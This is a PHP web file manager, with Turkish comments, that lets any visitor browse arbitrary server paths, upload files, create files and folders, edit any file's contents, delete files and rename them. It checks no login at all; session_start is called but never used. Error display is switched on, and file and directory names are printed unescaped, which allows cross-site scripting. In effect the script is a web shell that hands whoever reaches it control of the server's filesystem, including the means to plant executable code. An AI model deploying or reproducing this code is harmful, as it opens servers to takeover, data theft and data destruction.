<?php
// ============================
// 🔧 ERROR REPORTING
// ============================
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

session_start();

// ============================
// 📂 PATH AYARLARI
// ============================
$currentPath = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$currentPath || !is_dir($currentPath)) {
    $currentPath = getcwd();
}

$item = isset($_GET['item']) ? basename($_GET['item']) : '';
$itemPath = $currentPath . DIRECTORY_SEPARATOR . $item;

// ============================
// 📋 DİZİN GÖRÜNTÜLEME
// ============================
function showDirectory($dir)
{
    $entries = array_diff(scandir($dir), ['.', '..']);
    echo "<h2>📁 Directory: $dir</h2><ul>";

    foreach ($entries as $entry) {
        $fullPath = realpath($dir . DIRECTORY_SEPARATOR . $entry);
        $isDir = is_dir($fullPath);
        $icon = $isDir ? "📂" : "📄";

        echo "<li>$icon ";

        if ($isDir) {
            echo "<a href='?path=" . urlencode($fullPath) . "'>$entry</a>";
        } else {
            echo "$entry 
                [<a href='?path=" . urlencode($dir) . "&action=edit&item=" . urlencode($entry) . "'>Edit</a>] 
                [<a href='?path=" . urlencode($dir) . "&action=delete&item=" . urlencode($entry) . "'>Delete</a>] 
                [<a href='?path=" . urlencode($dir) . "&action=rename&item=" . urlencode($entry) . "'>Rename</a>]";
        }

        echo "</li>";
    }

    echo "</ul>";
}

// ============================
// 📤 DOSYA YÜKLEME
// ============================
function uploadFile($dir)
{
    if (!empty($_FILES['file']['name'])) {
        $target = $dir . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
            echo "<p style='color:green;'>✅ File uploaded successfully!</p>";
        } else {
            echo "<p style='color:red;'>❌ Upload failed.</p>";
        }
    }
}

// ============================
// 🆕 KLASÖR VE DOSYA OLUŞTURMA
// ============================
function makeFolder($dir)
{
    $folder = trim($_POST['folder_name']);
    if (!$folder) return;

    $folderPath = $dir . DIRECTORY_SEPARATOR . $folder;
    if (!file_exists($folderPath)) {
        mkdir($folderPath);
        echo "<p style='color:green;'>📁 Folder created: $folder</p>";
    } else {
        echo "<p style='color:red;'>⚠️ Folder already exists.</p>";
    }
}

function makeFile($dir)
{
    $file = trim($_POST['file_name']);
    if (!$file) return;

    $filePath = $dir . DIRECTORY_SEPARATOR . $file;
    if (!file_exists($filePath)) {
        file_put_contents($filePath, '');
        echo "<p style='color:green;'>📄 File created: $file</p>";
    } else {
        echo "<p style='color:red;'>⚠️ File already exists.</p>";
    }
}

// ============================
// ✏️ DOSYA DÜZENLEME
// ============================
function editFile($path)
{
    if (!file_exists($path)) {
        echo "<p style='color:red;'>❌ File not found.</p>";
        return;
    }

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        file_put_contents($path, $_POST['content']);
        echo "<p style='color:green;'>✅ Saved successfully!</p>";
    }

    $content = htmlspecialchars(file_get_contents($path));
    echo "<h3>📝 Editing: " . basename($path) . "</h3>
          <form method='POST'>
            <textarea name='content' style='width:100%; height:300px;'>$content</textarea><br>
            <button type='submit'>Save</button>
          </form>";
}

// ============================
// 🗑️ DOSYA SİLME
// ============================
function removeFile($path)
{
    if (file_exists($path) && is_file($path)) {
        unlink($path);
        echo "<p style='color:green;'>🗑️ File deleted.</p>";
    } else {
        echo "<p style='color:red;'>❌ File not found.</p>";
    }
}

// ============================
// 🏷️ YENİDEN ADLANDIRMA
// ============================
function renameItem($path)
{
    if (!file_exists($path)) {
        echo "<p style='color:red;'>❌ Item not found.</p>";
        return;
    }

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['new_name'])) {
        $newPath = dirname($path) . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
        if (rename($path, $newPath)) {
            echo "<p style='color:green;'>✅ Renamed successfully!</p>";
        } else {
            echo "<p style='color:red;'>❌ Rename failed.</p>";
        }
    } else {
        echo "<h3>✏️ Rename: " . basename($path) . "</h3>
              <form method='POST'>
                <input type='text' name='new_name' placeholder='New name' required>
                <button type='submit'>Rename</button>
              </form>";
    }
}

// ============================
// ⚙️ İŞLEMLER
// ============================
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['file'])) uploadFile($currentPath);
    if (isset($_POST['folder_name'])) makeFolder($currentPath);
    if (isset($_POST['file_name'])) makeFile($currentPath);
}

if (isset($_GET['action']) && $item) {
    switch ($_GET['action']) {
        case 'edit': editFile($itemPath); break;
        case 'delete': removeFile($itemPath); break;
        case 'rename': renameItem($itemPath); break;
    }
}

// ============================
// 🔙 GERİ GİTME VE FORM BÖLÜMÜ
// ============================
echo "<a href='?path=" . urlencode(dirname($currentPath)) . "'>⬅️ Go Up</a>";
showDirectory($currentPath);
?>

<hr>

<h3>📤 Upload File</h3>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file" required>
    <button type="submit">Upload</button>
</form>

<h3>📁 Create Folder</h3>
<form method="POST">
    <input type="text" name="folder_name" placeholder="Folder name" required>
    <button type="submit">Create</button>
</form>

<h3>📄 Create File</h3>
<form method="POST">
    <input type="text" name="file_name" placeholder="File name" required>
    <button type="submit">Create</button>
</form>